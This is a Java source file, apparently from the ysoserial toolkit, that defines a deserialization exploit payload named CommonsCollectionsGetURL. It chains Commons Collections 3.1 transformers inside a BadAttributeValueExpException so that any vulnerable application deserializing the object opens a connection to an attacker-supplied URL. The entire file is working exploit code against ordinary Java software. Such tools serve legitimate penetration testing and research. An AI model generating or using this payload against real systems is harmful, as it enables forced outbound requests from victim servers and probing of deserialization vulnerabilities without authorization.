package ysoserial.payloads;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollectionsGetURL extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

    public BadAttributeValueExpException getObject(final String command) throws Exception {
        final String[] execArgs = new String[] { command };

        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) }
        );

        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(new URL(execArgs[0])),
            new InvokerTransformer(
                "openConnection",
                new Class[] {},
                new Object[] {}
            ),
                new InvokerTransformer(
                "getInputStream",
                new Class[] {},
                new Object[] {}
            ),
            new ConstantTransformer(1)
        };

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsGetURL.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
